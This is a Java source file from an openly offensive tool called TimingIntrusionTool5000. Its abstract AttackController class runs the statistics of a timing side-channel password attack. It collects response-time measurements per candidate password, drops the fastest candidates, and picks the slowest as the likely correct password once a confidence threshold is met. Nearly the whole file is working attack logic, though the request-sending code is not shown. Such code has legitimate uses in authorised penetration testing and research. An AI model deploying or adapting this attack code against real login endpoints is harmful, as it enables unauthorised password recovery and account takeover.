package timingattack.controllers;

import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicInteger;
import timingattack.Statistics;

/**
 *
 * @author aj
 */
public abstract class AttackController {

    protected final HashMap<String, List<Long>> measurements;
    protected final List<String> pwdList;
    protected final AtomicInteger requestCount;
    protected final boolean doLoserDrop;
    protected final long startTime;
    protected final double confidenceRequired;
    
    protected int roundCount = 0;
    protected boolean isDone = false;
    protected int initalPwdCount;
    private long lastStatsPrintTime = -1;
    
    
    public AttackController(List<String> pwdList, HashMap<String, List<Long>> measurements, AtomicInteger requestCount, double confidenceRequired) {
        this(pwdList, measurements, requestCount, confidenceRequired, true);
    }

    public AttackController(List<String> pwdList, HashMap<String, List<Long>> measurements, AtomicInteger requestCount, double confidenceRequired, boolean doLoserDrop) {
        this.pwdList = pwdList;
        this.measurements = measurements;
        this.initalPwdCount = pwdList.size();
        this.requestCount = requestCount;
        this.doLoserDrop = doLoserDrop;
        this.startTime = System.currentTimeMillis();
        this.confidenceRequired = confidenceRequired;
    }
    
    
    
    public abstract void handleWinner(Statistics winnerStats) throws Exception;

    public abstract void printStats(List<Statistics> stats);   
    
    protected abstract Statistics getStats(String pwd, List<Long> times);
    

    public void roundComplete() throws Exception {

        this.roundCount++;

        if (roundCount % 100 == 0) {

            List<Statistics> stats = listStats();
            Collections.sort(stats);

            if (stats.size() < 3) //not enough stats yet
            {
                return;
            }

            Statistics winnerStats = stats.get(stats.size() - 1);
            WinnerConfidence winnerConfidence = getWinnerConfidence(stats);
            
            if ((System.currentTimeMillis() - lastStatsPrintTime) > 5000) { //print every 5 secs max
                printStatsAndWinner(stats, winnerStats, winnerConfidence);
                lastStatsPrintTime = System.currentTimeMillis();
            }
            
            if (winnerConfidence.finalConfidence >= 1.0) {
                printStatsAndWinner(stats, winnerStats, winnerConfidence);
                handleWinner(winnerStats);
            }

            //drop loser every 10k rounds
            if (doLoserDrop && roundCount % 10000 == 0 && pwdList.size() > 7) { 

                String loserPwd = stats.get(0).getPwd();
                System.out.println("Dropping fastest canididate: " + loserPwd);

                pwdList.remove(loserPwd);

                synchronized (measurements) {
                    measurements.remove(loserPwd);
                }
            }
            
            //hopefully eliminate any order bias
            Collections.shuffle(pwdList);
            
        }

        //BAIL
        if (requestCount.get() / initalPwdCount >= 1000000) {
            System.err.println("Max request hit (1000000 per pwd). This server is probably NOT vulnerable.");
            isDone = true;
        }

    }

    private void printStatsAndWinner(List<Statistics> stats, Statistics winnerStats, WinnerConfidence winnerConfidence) {
        
        printStats(stats);
                
        long totalTime = System.currentTimeMillis() - startTime;
        int seconds = (int) (totalTime / 1000) % 60;
        int minutes = (int) ((totalTime / (1000 * 60)) % 60);
        int hours   = (int) ((totalTime / (1000 * 60 * 60)) % 24);
        int reqsPerSec = seconds < 1 ? requestCount.get() : requestCount.get() / ((int)totalTime / 1000);

        System.out.format("\nElapsed %02d:%02d:%02d at %d req/s average (%d total).\n", hours, minutes, seconds, reqsPerSec, requestCount.get());
        System.out.format("Current Candidate: %s, Confidence: %.2f%% (%.0f/%.0f)\n\n", winnerStats.getPwd(), winnerConfidence.finalConfidence * 100, winnerConfidence.winnerAndRunnerUpDelta, winnerConfidence.nonWinnerRange);

    }
    
    
    /**
     * The confidence of the winner is based on if the slowest password is enough of an
     * outlier or not. To work this out we calculate the range of the other password
     * measurements, and compare this to the difference of the outlier and the next slowest
     * password. We then compare this against our confidence requirements and if the requirement
     * is met, we have a winner.
     */
    private WinnerConfidence getWinnerConfidence(List<Statistics> stats) {

        Statistics winner = stats.get(stats.size() - 1);
        Statistics runnerUp = stats.get(stats.size() - 2);

        //range of non winners
        long min = Long.MAX_VALUE, max = Long.MIN_VALUE;
        for (int i = 0; i < stats.size() - 1; i++) { //skip winner

            Statistics stat = stats.get(i);

            min = Math.min(min, stat.getTenthCentile());
            max = Math.max(max, stat.getTenthCentile());
        }

        double range = max - min;
        range = range / (pwdList.size() / (double) initalPwdCount); //increase range based on how many pwds dropped

        double deltaWinnerAndNextBest = winner.getTenthCentile() - runnerUp.getTenthCentile();

        double percentOfRange = deltaWinnerAndNextBest / range;



        //=0.8+(0.996^(REQUESTS/100))*20
        //this calc means we start with very high confidence requirements until the number
        //of request rounds reaches a decent amount. In which case there'll be less crazy
        //jitter allowing a lower confidence requirement. The base "confidenceRequired" double
        //is essentially a floor value, confidence must be above that for a winner to be selected.
        double requiredConfidence = confidenceRequired + (Math.pow(0.990, (roundCount / 100))) * 20;

        double finalConfidence = percentOfRange / requiredConfidence;
        
        WinnerConfidence result = new WinnerConfidence();
        result.finalConfidence = finalConfidence;
        result.nonWinnerRange = range;
        result.winnerAndRunnerUpDelta = deltaWinnerAndNextBest;
        
        return result;

    }

    private List<Statistics> listStats() {

        List<Statistics> stats = new ArrayList<Statistics>();

        synchronized (measurements) {
            for (Map.Entry<String, List<Long>> entry : measurements.entrySet()) {

                String pwd = entry.getKey();
                List<Long> times = entry.getValue();
                if (times.size() < 50) {
                    continue; //skip cause too small
                }
                Statistics s = getStats(pwd, times);
                stats.add(s);
            }
        }

        return stats;
    }
    
    
    //check measurements for change, if no change return, otherwise wait
    protected void waitForRequestsToFinish() {

        System.out.println("Waiting for requests to finish.");
        
        int prevTotalMeasures = -1;
        while (true) {

            int totalMeasures = 0;
            synchronized (measurements) {
                for (Map.Entry<String, List<Long>> entry : measurements.entrySet()) {
                    totalMeasures += entry.getValue().size();
                }

            }

            if (totalMeasures == prevTotalMeasures) {
                return;
            } else {

                prevTotalMeasures = totalMeasures;

                try {
                    Thread.sleep(3000);
                } catch (InterruptedException e) {
                }

            }
        }
    }

    public boolean isDone() {
        return isDone;
    }
    
    private class WinnerConfidence {
        public double finalConfidence, nonWinnerRange, winnerAndRunnerUpDelta;        
    }
}



/*
 * This file is part of the TimingIntrusionTool5000.
 * 
 * TimingIntrusionTool5000 is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * TimingIntrusionTool5000 is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with Foobar.  If not, see <http://www.gnu.org/licenses/>.
 */